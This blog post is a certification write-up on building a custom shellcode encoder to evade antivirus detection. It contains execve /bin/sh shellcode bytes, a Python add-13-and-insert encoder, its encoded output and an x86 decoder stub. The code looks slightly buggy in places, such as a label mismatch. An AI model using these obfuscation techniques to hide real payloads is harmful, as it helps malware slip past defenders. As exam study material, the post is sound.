---
layout: post
title: SLAE 4 - Custom Encoder
date:   2019-02-28
categories: [SLAE, Assembly]
---

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

The fourth question for the SLAE exam is to create a custom encoder.  The requirements are:
* Create a custom encoding scheme like the "insertion encoder" from the course
* Show a PoC that uses execve-stack as the shellcode to encode with the schema and execute it

## Creating a custom encoder

A custom encoder is used in order to evade antivirus detection.  If a signature is made to detect a specific portion of code, then an encoder will obfuscate the code so that it does not recognize it as the known suspicious/malicious behavior.

Our steps are:
1. Decide on an encoding scheme to obfuscate the shellcode
2. Implement an encoder (in Python) that outputs the encoded shellcode
3. Create a decoding stub (in assembly) that manipulates the shellcode, in memory, and then hands off execution to the original shellcode

The trick here is that we will need a way to grab the memory address of the shellcode which is dynamic.  There is a known technique that we learned in the SLAE course that uses the JMP-CALL-POP instruction combination to obtain the shellcode's address during runtime.  
```asm
_start:
    jmp short get_sc
    
decode_stub:
    pop esi
    ...
    
get_sc:
    call decode_stub
    shellcode: db 0x3c,..... 
```
When we jump to get_sc, our two instructions are a call followed by our shellcode variable.  When the call is made, the next instruction's address is pushed to the stack so that when the call returns, we have the location to continue execution.  Since our first instruction when we land at our jump (decode_stub) is a pop instruction, it pops the address of our shellcode into the register of our choice!

One big note here is that the jmp short is used in order to prevent NULL bytes!  A post about this little trick that goes in to great detail can be found here:

https://marcosvalle.github.io/osce/2018/05/06/JMP-CALL-POP-technique.html

With that technique described.. it's time to start deciding on an encoding scheme.

The SLAE course provides an example insertion encoding scheme.  I decided to use this idea and add another encoding idea to it.  The encoder will rot-13 the shellcode and insert 1 random byte after each byte of shellcode.

as an example,:

0x11,0x11,0x11,0x11

will become something similar to:

0x1E,0xCE,0x1E,0xA2,0x1E,0x24,0x1E,0xE9,0xbb,0xbb

In order to detect the end of our shellcode, we will add 0xbb,0xbb to the end.  This idea was suggested in the course video as well.  This way we don't need to hardcode the length and can cmp to 0xbb then jump out if we have found it.

Our encoder is written in Python and we are encoding the shellcode "execve-stack.nasm" from the provided course materials:
```python
import random

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded1 = ""
encoded2 = ""

for b in bytearray(shellcode):

	encoded1 += '\\x'
	encoded1 += '%02x' % ((b+13)%256)   # add rot-13'd shellcode

# 0xfa was causing issues when compiled, create check to avoid using it. Can add values to the array initialization if more become an issue
	bad_vals = [0xfa]
    	while True:
		rand = random.randint(1,256)
        	if rand not in bad_vals:
	        	break
            
	encoded1 += '\\x%02x' % rand        # insert random byte

	encoded2 += '0x'
	encoded2 += '%02x,' % ((b+13)%256)  # add rot-13'd shellcode
	encoded2 += '0x%02x,' % rand        # insert random byte

encoded1 += '\\xbb\\xbb'                # add our detection byte
encoded2 += '0xbb,0xbb'


print(encoded1)
print(encoded2)

print('Length: %d' % len(bytearray(shellcode)))
```
So we have 2 different forms of output, our usual "\x" bytes and the 0x, comma separated list which will be used in the assembly code.

Running this we receive the output:
```
0x3e,0x62,0xcd,0x8b,0x5d,0xb1,0x75,0x20,0x3c,0xb7,0x3c,0x5e,0x80,0x36,0x75,0xee,0x75,0x25,0x3c,0x05,0x6f,0xa3,0x76,0x8e,0x7b,0xea,0x96,0xa3,0xf0,0x8c,0x5d,0x6d,0x96,0x42,0xef,0x2a,0x60,0xe6,0x96,0xac,0xee,0xb3,0xbd,0x95,0x18,0x71,0xda,0x73,0x8d,0x04,0xbb,0xbb
```
We will save this for later.. 

Now to create the decoder:

We will need to set up our skeleton which will include the jmp-call-pop at the start:
```asm
global _start

section .text

_start:
    jmp short call_shellcode
    
decoder:
    pop esi

call_shellcode:
    call decoder
    ShellCode: db 0x3e,0x62,0xcd,0x8b,0x5d,0xb1,0x75,0x20,0x3c,0xb7,0x3c,0x5e,0x80,0x36,0x75,0xee,0x75,0x25,0x3c,0x05,0x6f,0xa3,0x76,0x8e,0x7b,0xea,0x96,0xa3,0xf0,0x8c,0x5d,0x6d,0x96,0x42,0xef,0x2a,0x60,0xe6,0x96,0xac,0xee,0xb3,0xbd,0x95,0x18,0x71,0xda,0x73,0x8d,0x04,0xbb,0xbb
```
The steps we will take in the main decode loop are:
1. Grab next byte to decode
2. Check for our tail (0xbb,0xbb). we check for both in a row just in case we run in to a single instance of 0xbb
3. If tail found, pass execution
4. Decode ROT-13 for the byte
5. Place decoded byte into proper position
6. Increase counters (our pointer to insertion location, and our pointer to the next encoded byte)
7. Loop

```asm
decoder:
	pop esi			; end of jmp-call-pop
	lea edi, [esi]		; set up first insertion byte address
	xor eax, eax
	xor ebx, ebx
decode:
	mov bl, byte [esi + eax]	; sc addr + insert count - this selects the next encoded shellcode byte
	cmp bl, 0xbb			; check for first byte of shellcode tail
	jnz cont
	cmp byte [esi + eax + 1], 0xbb	; check for 2nd byte of shellcode tail
	jz Shellcode			; end of shellcode - hand off execution
cont:
	sub bl, 13			; decode rot-13
	mov byte [edi], bl		; replace byte with the decoded byte
	inc edi				; increase edi to point to next byte to replace
	add al, 2			; increase al by 2 to the next inserted byte
	jmp short decode		; start loop over

call_shellcode:
```
bl stores \[esi + eax\], which translates to \[shellcode_addr + insertion byte counter\].  Since we are alternating between shellcode bytes and random inserted bytes, we increase al by 2 for each iteration.  This lets us skip the inserted byte and grab each byte of the encoded shellcode.

We then subtract 13 from the encoded byte value in order to obtain the original shellcode byte.  Then we move it into \[edi\]. EDI is our pointer for where the next byte of decoded shellcode should go.  
